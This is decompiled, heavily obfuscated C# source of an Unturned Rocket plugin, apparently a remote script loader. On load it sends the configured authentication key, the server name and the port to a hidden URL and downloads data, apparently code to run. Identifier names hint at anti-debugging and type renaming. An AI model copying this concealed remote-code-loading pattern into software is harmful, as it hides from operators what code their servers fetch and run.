using System;
using System.Net;
using System.Reflection;
using _003CPrivateImplementationDetails_003E_007B4655B3D5_002DB2C8_002D44CC_002D822D_002D4BC455962FE1_007D;
using Rocket.Core.Logging;
using Rocket.Core.Plugins;
using SDG.Unturned;
using Ster.uScriptLoader;

namespace A
{
	public class A : RocketPlugin<Config>
	{
		public static A A;

		public static readonly Func<int, int> TG9hZHVTY3JpcHQ_003DRG93bmxvYWRGYWlsZWQ_003DRG93bmxvYWRGYWlsZWQ_003D = UGF0Y2hfUHJlZml4UmV2ZXJzZURlYnVnZ2luZw_003D_003DZ2V0SW5mbw_003D_003D;

		protected override void Load()
		{
			//IL_0203: Unknown result type (might be due to invalid IL or missing references)
			//IL_020d: Expected O, but got Unknown
			//IL_02a2: Unknown result type (might be due to invalid IL or missing references)
			//IL_02ac: Expected O, but got Unknown
			//IL_02bf: Unknown result type (might be due to invalid IL or missing references)
			//IL_02c9: Expected O, but got Unknown
			int num = 0;
			_003C_003Ec__DisplayClass1_0 _003C_003Ec__DisplayClass1_ = default(_003C_003Ec__DisplayClass1_0);
			bool? flag = default(bool?);
			int num2;
			bool? flag2 = default(bool?);
			int num3 = default(int);
			while (true)
			{
				if (num == 5)
				{
					_003C_003Ec__DisplayClass1_._klu = _317E3346_002D2EAC_002D401E_002D8C50_002DF135246F6C81.B();
					num = 6;
				}
				if (num == 8)
				{
					if (flag.HasValue)
					{
						num2 = (flag.GetValueOrDefault() ? 1 : 0);
						break;
					}
					num = 9;
				}
				if (num == 3)
				{
					global::A.A.A = this;
					num = 4;
				}
				if (num == 6)
				{
					flag2 = ((RocketPlugin<Config>)global::A.A.A).get_Configuration().get_Instance().Enabled;
					num = 7;
				}
				if (num == 7)
				{
					flag = flag2;
					num = 8;
				}
				if (num == 2)
				{
					_003C_003Ec__DisplayClass1_ = new _003C_003Ec__DisplayClass1_0();
					num = 3;
				}
				if (num == 1)
				{
					num3 = 1106550565;
					num = 2;
				}
				if (num == 4)
				{
					_003C_003Ec__DisplayClass1_._anl = _317E3346_002D2EAC_002D401E_002D8C50_002DF135246F6C81.a();
					num = 5;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num != 9)
				{
					continue;
				}
				num2 = 1;
				break;
			}
			if (num2 == 0)
			{
				string text = _317E3346_002D2EAC_002D401E_002D8C50_002DF135246F6C81.b();
				int num4 = num3;
				num4 = ((num4 == 2028366105 - 698520995) ? (1375089951 / 1) : Math.Abs(14));
				A(text, (ConsoleColor)num4);
				return;
			}
			_003C_003Ec__DisplayClass1_.wc = new WebClient();
			_003C_003Ec__DisplayClass1_._af = _317E3346_002D2EAC_002D401E_002D8C50_002DF135246F6C81.C();
			_003C_003Ec__DisplayClass1_.eirp = _317E3346_002D2EAC_002D401E_002D8C50_002DF135246F6C81.c();
			_003C_003Ec__DisplayClass1_.sc_pl = _317E3346_002D2EAC_002D401E_002D8C50_002DF135246F6C81.D();
			_003C_003Ec__DisplayClass1_.conn = string.Format(_317E3346_002D2EAC_002D401E_002D8C50_002DF135246F6C81.d(), ((RocketPlugin<Config>)global::A.A.A).get_Configuration().get_Instance().AuthenticationKey.Replace(_317E3346_002D2EAC_002D401E_002D8C50_002DF135246F6C81.E(), _317E3346_002D2EAC_002D401E_002D8C50_002DF135246F6C81.e()), Uri.EscapeUriString(Provider.get_serverName()), Provider.port);
			_003C_003Ec__DisplayClass1_.tries = 0;
			_003C_003Ec__DisplayClass1_.wc.add_DownloadDataCompleted(new DownloadDataCompletedEventHandler(_003C_003Ec__DisplayClass1_._003CLoad_003Eb__0));
			_003C_003Ec__DisplayClass1_.wc.DownloadDataAsync(new Uri(_003C_003Ec__DisplayClass1_.conn));
		}

		public static void A(string P_0, ConsoleColor P_1)
		{
			//Discarded unreachable code: IL_0104
			//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
			//IL_0241: Unknown result type (might be due to invalid IL or missing references)
			int num = 0;
			int num3 = default(int);
			int num4 = default(int);
			MethodInfo method = default(MethodInfo);
			string text = default(string);
			bool flag = default(bool);
			do
			{
				if (num == 4)
				{
					Type typeFromHandle = typeof(Logger);
					string name = _317E3346_002D2EAC_002D401E_002D8C50_002DF135246F6C81.f();
					int num2 = Math.Abs(1338084786);
					num2 = ((num2 == 1663710825 + 118669364) ? num3 : num4);
					method = typeFromHandle.GetMethod(name, (BindingFlags)num2);
					num = 5;
				}
				if (num == 2)
				{
					num4 = 56;
					num = 3;
				}
				if (num == 1)
				{
					num3 = 371210316;
					num = 2;
				}
				if (num == 9)
				{
					goto IL_00d8;
				}
				goto IL_00ee;
				IL_00d8:
				Logger.Log(text, P_1);
				num = 10;
				goto IL_00ee;
				IL_00ee:
				switch (num)
				{
				case 8:
					return;
				case 5:
					flag = method != null;
					num = 6;
					break;
				}
				if (num == 3)
				{
					text = _317E3346_002D2EAC_002D401E_002D8C50_002DF135246F6C81.F() + P_0;
					num = 4;
				}
				if (num == 7)
				{
					MethodInfo methodInfo = method;
					int num5 = TG9hZHVTY3JpcHQ_003DRG93bmxvYWRGYWlsZWQ_003DRG93bmxvYWRGYWlsZWQ_003D(-2116059495 - 453432500);
					num5 = ((num5 == Math.Abs(959528176)) ? (968201601 + "\u0310\u031f\u032c\u030e\u0351\u0327\u035f\u034a\u0301\u0367\u033d\u0311\u0308".Length) : (-1 + "\u036c\u0358\u0365\u036b".Length));
					object[] array = new object[num5];
					array[0] = (object)(ELogType)0;
					array[1] = text;
					int num6 = -396057031 / 3;
					num6 = ((num6 == 1523729688) ? (1088168310 - 360922991) : 2);
					array[num6] = P_1;
					methodInfo.Invoke(null, array);
					num = 8;
				}
				if (num == 6)
				{
					if (!flag)
					{
						goto IL_00d8;
					}
					num = 7;
				}
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 10);
		}

		public static void A(string P_0)
		{
			int num = 0;
			do
			{
				if (num == 1)
				{
					Logger.LogError(_317E3346_002D2EAC_002D401E_002D8C50_002DF135246F6C81.F() + P_0);
					num = 2;
				}
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 2);
		}

		protected override void Unload()
		{
			int num = 0;
			do
			{
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 1);
		}

		public static int UGF0Y2hfUHJlZml4UmV2ZXJzZURlYnVnZ2luZw_003D_003DZ2V0SW5mbw_003D_003D(int P_0)
		{
			//Discarded unreachable code: IL_0047
			int num = 0;
			int result = default(int);
			do
			{
				if (num == 1)
				{
					result = P_0;
					num = 2;
				}
				switch (num)
				{
				case 0:
					num = 1;
					continue;
				default:
					continue;
				case 2:
					break;
				}
				break;
			}
			while (num != 3);
			return result;
		}

		public static int UmVuYW1lVHlwZXM_003D(char P_0)
		{
			//Discarded unreachable code: IL_0047
			int num = 0;
			int result = default(int);
			do
			{
				if (num == 1)
				{
					result = P_0;
					num = 2;
				}
				switch (num)
				{
				case 0:
					num = 1;
					continue;
				default:
					continue;
				case 2:
					break;
				}
				break;
			}
			while (num != 3);
			return result;
		}
	}
}
